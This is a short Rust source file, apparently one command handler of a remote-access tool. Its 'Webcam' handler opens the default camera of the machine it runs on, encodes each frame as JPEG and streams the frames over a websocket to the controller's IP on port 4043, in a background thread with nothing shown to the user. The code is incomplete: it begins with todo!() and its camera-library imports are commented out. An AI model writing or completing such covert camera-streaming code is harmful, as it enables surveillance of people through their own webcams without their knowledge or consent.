use tungstenite::{connect, Message};

// use opencv::prelude::*;
// use opencv::videoio;

use crate::handlers::func::Function;
struct Webcam;
impl Function for Webcam {
    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
        todo!();

        let url = format!("ws://{}:4043", ctx.conn.ip);
        let (mut socket, _response) = connect(&url).unwrap();
        println!("Socket connected");

        // Create new thread so it doesn't block
        std::thread::spawn(move || {
            let mut cam = match videoio::VideoCapture::new(0, videoio::CAP_ANY) {
                Ok(c) => c,
                Err(_) => {
                    socket.send("Failed to open camera".into()).unwrap();
                    return;
                }
            };

            if !videoio::VideoCapture::is_opened(&cam).unwrap() {
                socket
                    .send("Failed to open default camera.".into())
                    .unwrap();
                return;
            }

            loop {
                let mut frame = Mat::default();
                if !cam.read(&mut frame).unwrap() {
                    socket.send("Failed to capture frame.".into()).unwrap();
                    break;
                }

                let mut buf = opencv::core::Vector::new();
                opencv::imgcodecs::imencode(
                    ".jpg",
                    &frame,
                    &mut buf,
                    &opencv::core::Vector::<i32>::new(),
                )
                .unwrap();
                socket.send(Message::Binary(buf.into())).unwrap();
            }
        });
        Ok(())
    }
}
